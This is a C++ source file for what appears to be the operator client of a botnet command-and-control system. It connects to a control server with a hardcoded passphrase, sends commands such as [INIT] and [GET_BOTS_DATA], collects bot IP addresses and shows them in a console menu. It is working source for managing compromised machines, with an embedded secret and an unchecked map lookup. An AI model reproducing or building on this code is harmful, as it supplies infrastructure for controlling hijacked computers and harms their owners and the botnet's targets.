#include "manager.h"

manager::manager(io::io_context& io_context, std::uint16_t port, std::string server_ip, std::uint16_t server_port)
    : io_context_(io_context),
      acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
      server_ip_(server_ip),
      server_port_(server_port) {
	passphrase_ = "flk23f9f_f=fsd";

	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]",
	     boost::bind(&manager::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[INIT]",
	     boost::bind(&manager::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[GET_BOTS_DATA]", boost::bind(&manager::handleGetBotsData, this, boost::placeholders::_1, boost::placeholders::_2,
					    boost::placeholders::_3)},
	};
	interactive_.menu_handlers_ = {
	    {"u", boost::bind(&manager::getBotsData, this)},
	};
}

void manager::start() {
	tcp::socket socket(io_context_);
	socket_ = std::move(socket);

	err error;
	tcp::endpoint endpoint(io::ip::make_address(server_ip_), server_port_);

	socket_->connect(endpoint, error);

	auto server = server_session_container_.emplace_back(std::make_shared<session>(std::move(*socket_), io_context_, 1));
	server->start(boost::bind(&manager::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));

	std::vector<std::string> output_params = {passphrase_};
	std::string command = "[INIT]";
	server->send(msg_parser_.genCommand(command, output_params));
	server->read();
}

void manager::handleResponse(std::string& query, session* manager) {
	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		return;
	}
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], manager);
}

void manager::handleAlive(std::string& command, std::vector<std::string>& params, session* server) {
	std::vector<std::string> output_params = {"1"};
	server->send(msg_parser_.genCommand(command, output_params));
}

void manager::handleInit(std::string& command, std::vector<std::string>& params, session* server) {
	if (!params.size()) return;
	if (stoi(params[0])) {
		ui_start_ = std::async(std::launch::async, &user_interface::start, &interactive_);
	}
}

void manager::handleGetBotsData(std::string& command, std::vector<std::string>& params, session* server) {
	if (!params.size()) return;
	std::string curr;
	int parameters_num = stoi(params[0]);
	std::vector<int> max_value_size(parameters_num, 0);

	for (int i = 1; i < params.size(); ++i) {
		for (int j = 0; j < parameters_num; ++j) {
			curr = params[i + j];

			if (max_value_size[j] < curr.size()) {
				max_value_size[j] = curr.size();
			}
			if (j == 0) {
				bot_ip_addresses_.push_back(curr);
			}
		}
		i += parameters_num - 1;
	}

	std::vector<std::string> data_output;
	std::string separator = std::string(10, ' ');

	for (int i = 1 + parameters_num ; i < params.size(); ++i) {
		std::vector<std::string> line;

		for (int j = 0; j < parameters_num; ++j) {
			line.push_back(params[i + j] + std::string(max_value_size[j] - params[i + j].size(), ' '));
		}
		data_output.push_back(boost::algorithm::join(line, separator));
		i += parameters_num - 1;
	}
	interactive_.updateBots(data_output);
    interactive_.updateTitles(params, max_value_size, separator);
}

void manager::getBotsData() {
	std::vector<std::string> output_params{passphrase_};
	std::string command = "[GET_BOTS_DATA]";
	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
}
